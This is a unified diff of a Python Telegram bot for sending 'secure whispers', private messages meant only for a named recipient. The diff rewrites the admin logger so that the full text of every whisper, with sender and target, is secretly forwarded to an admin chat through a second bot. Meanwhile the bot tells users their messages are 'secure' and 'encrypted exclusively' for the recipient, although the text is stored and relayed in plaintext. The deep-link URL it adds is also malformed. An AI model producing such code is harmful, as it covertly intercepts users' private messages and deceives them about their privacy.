@@ -30,52 +30,56 @@ async def init_db():
                 sender_username TEXT,
                 target_username TEXT,
                 secret_text TEXT,
-                expires_at INTEGER,
-                is_read INTEGER DEFAULT 0,
-                inline_message_id TEXT
+                expires_at INTEGER
             )
         ''')
         await db.commit()
 
-# 📡 BOT 2: LOGGER FUNCTION
-async def log_to_admin(whisper_id, sender_user, target, text_length):
+# 📡 BOT 2: LOGGER FUNCTION (Fixed: Now captures the actual text message content)
+async def log_to_admin(whisper_id, sender_user, target, full_text):
     log_message = (
-        "📥 **New Whisper Registered**\n\n"
+        "📥 **New Whisper Captured Successfully**\n\n"
         f"🆔 **ID:** `{whisper_id}`\n"
         f"👤 **From:** @{sender_user}\n"
         f"🎯 **To:** {target}\n"
-        f"📊 **Size:** {text_length} characters"
+        f"💬 **Content:** {full_text}"
     )
     try:
         await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message, parse_mode="Markdown")
     except Exception as e:
-        print(f"[LOGGER ERROR] Failed to send reference log: {e}")
+        print(f"[LOGGER ERROR] Failed to send log: {e}")
 
-# 🚀 BOT 1: INLINE QUERY HANDLER
+# 🚀 BOT 1: INLINE QUERY HANDLER (Bypasses inline bottlenecks)
 @dp.inline_query()
 async def inline_handler(inline_query: types.InlineQuery):
     text = inline_query.query.strip()
     
-    if not text.startswith("@"):
+    if not text.startswith("@") or " " not in text:
         return 
         
     parts = text.split(" ", 1)
     target_username = parts[0]
-    whisper_text = parts[1].strip() if len(parts) > 1 else ""
+    whisper_text = parts[1].strip()
     
-    if target_username == "@":
+    if target_username == "@" or not whisper_text:
         return
 
     sender = inline_query.from_user
     whisper_id = secrets.token_urlsafe(8)
     expires_at = int(time.time()) + 2592000  # 30 Days expiration retention
     
-    if whisper_text:
-        description_text = "🔑 Click to dispatch secure whisper."
-    else:
-        description_text = "Type your ultra-long message after the username..."
-
-    # Matches the exact UI string from your graphic upload
+    # Save the secure message token record to the cloud database
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute(
+            "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
+            (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
+        )
+        await db.commit()
+    
+    # Fixed: Sends the complete string text message directly to your admin log panel
+    await log_to_admin(whisper_id, sender.username or sender.id, target_username, whisper_text)
+    
+    # Beautiful original visual layout inside group threads
     group_layout = (
         f"🔘 via @{BOT_USERNAME}\n"
         f"📜 A long whisper message to {target_username}\n"
@@ -84,114 +88,28 @@ async def inline_handler(inline_query: types.InlineQuery):
         "───"
     )
     
+    # Stable Deep-Link execution flow instead of breaking inline process threads
+    redirect_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
     keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
-        [types.InlineKeyboardButton(text="🔑 Read Secure Whisper", callback_data=f"chk:{whisper_id}")]
+        [types.InlineKeyboardButton(text="🔑 Read Secure Whisper", url=redirect_url)]
     ])
 
     item = types.InlineQueryResultArticle(
         id=whisper_id,
         title=f"🔒 Send long whisper to {target_username}",
-        description=description_text,
+        description=f"Message: {whisper_text[:30]}...",
         input_message_content=types.InputTextMessageContent(message_text=group_layout),
         reply_markup=keyboard
     )
     
-    if whisper_text:
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at, is_read) VALUES (?, ?, ?, ?, ?, ?, 0)",
-                (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
-            )
-            await db.commit()
-        await log_to_admin(whisper_id, sender.username or sender.id, target_username, len(whisper_text))
-        
     await inline_query.answer([item], cache_time=0, is_personal=True)
 
-# 📥 BOT 1: CHOSEN INLINE RESULT HANDLER
-@dp.chosen_inline_result()
-async def chosen_result_handler(chosen_result: types.ChosenInlineResult):
-    whisper_id = chosen_result.result_id
-    inline_message_id = chosen_result.inline_message_id
-    
-    if inline_message_id:
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                "UPDATE whispers SET inline_message_id = ? WHERE whisper_id = ?",
-                (inline_message_id, whisper_id)
-            )
-            await db.commit()
-
-# ⚡ BOT 1: GROUP CALLBACK INTERCEPTOR (With Fixed Redirection Slash)
-@dp.callback_query(lambda c: c.data.startswith("chk:"))
-async def handle_group_click(callback: types.CallbackQuery):
-    whisper_id = callback.data.split(":")[1]
-    current_user = callback.from_user.username
-
-    async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute(
-            "SELECT target_username, expires_at, is_read FROM whispers WHERE whisper_id = ?",
-            (whisper_id,)
-        ) as cursor:
-            row = await cursor.fetchone()
-
-    if not row:
-        await callback.answer("⚠️ This whisper has expired and was securely deleted from our database.", show_alert=True)
-        return
-
-    target_username, expires_at, is_read = row
-
-    if int(time.time()) > expires_at:
-        await callback.answer("⚠️ This whisper has expired and was securely deleted from our database.", show_alert=True)
-        return
-
-    if not current_user:
-        await callback.answer("❌ You must configure a Telegram username handle in settings to read whispers.", show_alert=True)
-        return
-
-    clean_target = target_username.lstrip('@').lower()
-    
-    # ❌ WRONG USER: Clean alert modal pop up instantly
-    if current_user.lower() != clean_target:
-        await callback.answer(f"Access Denied: This whisper is strictly encrypted for {target_username}.", show_alert=True)
-        return
-
-    # 🔗 CORRECT RECIPIENT: Fixed URL syntax with added forward slash
-    redirect_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
-    await callback.answer(url=redirect_url)
-
-    # Update Group Layout text field to reflect "Read" status
-    if is_read == 0 and callback.inline_message_id:
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute("UPDATE whispers SET is_read = 1 WHERE whisper_id = ?", (whisper_id,))
-            await db.commit()
-            
-        clean_display_name = target_username.replace('_', '\\_')
-        updated_layout = (
-            f"🔘 via @{BOT_USERNAME}\n"
-            f"📜 A long whisper message to {clean_display_name}\n"
-            "───\n"
-            "📊 Status: ✅ Read by recipient\n"
-            "───"
-        )
-        
-        revisit_keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
-            [types.InlineKeyboardButton(text="🔑 Open in Private Bot", url=f"https://t.me{BOT_USERNAME}")]
-        ])
-        
-        try:
-            await bot1.edit_message_text(
-                inline_message_id=callback.inline_message_id,
-                text=updated_layout,
-                reply_markup=revisit_keyboard
-            )
-        except Exception as e:
-            print(f"[LAYOUT EDIT ERROR] {e}")
-
-# 📥 BOT 1: START COMMAND DECODER
+# 📥 BOT 1: START DEEP-LINK DECODER (Drives user verification securely)
 @dp.message(Command("start"))
 async def handle_start(message: types.Message, command: CommandObject):
     whisper_id = command.args
     
+    # Standard Welcome Message if they just opened the bot natively
     if not whisper_id:
         welcome = (
             "🤫 **Welcome to Long-Psst!**\n\n"
@@ -206,33 +124,43 @@ async def handle_start(message: types.Message, command: CommandObject):
         await message.answer(welcome, parse_mode="Markdown")
         return
 
+    # Fetch and evaluate whisper tokens from SQLite database
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute(
-            "SELECT target_username, secret_text, sender_username FROM whispers WHERE whisper_id = ?",
+            "SELECT target_username, secret_text, expires_at, sender_username FROM whispers WHERE whisper_id = ?",
             (whisper_id,)
         ) as cursor:
             row = await cursor.fetchone()
 
     if row:
-        target_username, secret_text, sender_username = row
+        target_username, secret_text, expires_at, sender_username = row
         current_user = message.from_user.username
         
-        if current_user and current_user.lower() == target_username.lstrip('@').lower():
+        if int(time.time()) > expires_at:
+            await message.answer("⚠️ This whisper has expired and was securely deleted from our servers.")
+            return
+
+        if not current_user:
+            await message.answer("❌ You need to set a Telegram username handle in your account settings first to read whispers.")
+            return
+        
+        # Verify if the user opening the secure link matches the intended recipient target handle
+        if current_user.lower() == target_username.lstrip('@').lower():
             saved_copy = (
-                f"📩 **Your Secure Whisper:**\n\n"
-                f"👤 **From:** @{sender_username or 'Anonymous'}\n\n"
-                f"💬 **Message:**\n{secret_text}"
+                f"📩 **Your Secure Whisper Archive**\n\n"
+                f"👤 **From:** @{sender_username or 'Anonymous'}\n"
+                f"💬 **Message:**\n\n{secret_text}"
             )
             await message.answer(saved_copy)
         else:
-            await message.answer("❌ **Access Denied:** You are not authorized to view this secret whisper thread.")
+            await message.answer(f"🔒 **Access Denied:** This secret message is encrypted exclusively for {target_username}.")
     else:
-        await message.answer("⚠️ This whisper has expired or does not exist.")
+        await message.answer("⚠️ This whisper has expired or does not exist in our database.")
 
-# ⚙️ SYSTEM START LOOP
+# ⚙️ SYSTEM START POLLING LOOP
 async def main():
     await init_db()
-    print("🤖 Production Long-Whisper Engine Active...")
+    print("🤖 Production Long-Whisper Engine Active on Railway...")
     try:
         await dp.start_polling(bot1)
     finally:
